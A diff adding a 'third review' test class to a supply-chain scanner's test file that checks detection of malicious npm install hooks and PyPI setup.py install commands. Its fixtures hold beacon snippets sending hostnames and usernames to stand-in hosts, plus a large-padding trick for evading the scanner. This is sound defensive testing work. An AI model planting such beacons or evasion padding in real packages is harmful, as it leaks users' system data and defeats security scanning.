@@ -656,3 +656,58 @@ class TestSecondReviewEvasions:
                "requests.get('https://x.example.net/', params={'n': u.nodename})\n"
                "setup(name='probe')\n")
         assert _sev(detect_pypi_install_exec(src, "setup.py")) == ["high"]
+
+
+# ---------------------------------------------------------------------------
+# third review of #436
+# ---------------------------------------------------------------------------
+
+
+class TestThirdReview:
+    def test_huge_padding_requires_do_not_use_up_the_budget(self):
+        beacon = ("require('./d0');require('./d1');\n"
+                  "const os = require('os'); const https = require('https');\n"
+                  "https.get('https://x.oast.fun/?h=' + os.hostname(), () => {});\n")
+        a = beacon + "// pad\n" * ((3000 - len(beacon)) // 7)
+        words = "// hostname userInfo eval _0x atob _authToken oast whoami base64\n"
+        pad = words + "/" * (8_388_000 - len(words))
+        f = _npm_hook_findings({"postinstall": "node a.js"},
+                               {"a.js": a, "d0.js": pad, "d1.js": pad})
+        assert _sev(f) == ["high"], f
+
+    @pytest.mark.parametrize("registration", [
+        "setup(name='probe', cmdclass=dict(install=install))\n",
+        "cmds = {}\ncmds['install'] = install\nsetup(name='probe', cmdclass=cmds)\n",
+    ])
+    def test_cmdclass_key_forms(self, registration):
+        src = ("import socket, requests\nfrom setuptools import setup\n"
+               "from setuptools.command.sdist import sdist\n"
+               "class install(sdist):\n    def run(self):\n"
+               "        requests.get('https://x.example.net/', "
+               "params={'h': socket.gethostname()})\n" + registration)
+        assert _sev(detect_pypi_install_exec(src, "setup.py")) == ["high"], registration
+
+    def test_username_in_a_banner_is_not_recon(self):
+        body = ("const os = require('os'); const https = require('https');\n"
+                "console.log(`Thanks ${os.userInfo().username}!`);\n"
+                "https.get('https://github.com/probe/probe/releases/download/v1/bin', "
+                "() => {});\n")
+        assert "recon" not in js_signals(body)
+        f = _npm_hook_findings({"postinstall": "node install.js"}, {"install.js": body})
+        assert _sev(f) == ["medium"]
+
+    def test_username_in_a_payload_object_still_counts(self):
+        body = ("const os = require('os'); const https = require('https');\n"
+                "const info = {\n  user: os.userInfo().username,\n};\n"
+                "https.get('https://x.example.net/?q=' + JSON.stringify(info), () => {});\n")
+        assert "recon" in js_signals(body)
+
+    def test_signals_read_once_across_hooks(self, monkeypatch):
+        import src.scanner.install_signals as sig
+        calls = []
+        real = sig.js_signals
+        monkeypatch.setattr(sig, "js_signals", lambda t: calls.append(1) or real(t))
+        f = _npm_hook_findings({"preinstall": "node h.js", "postinstall": "node h.js"},
+                               {"h.js": BEACON_JS})
+        assert _sev(f) == ["high", "high"]
+        assert len(calls) == 1
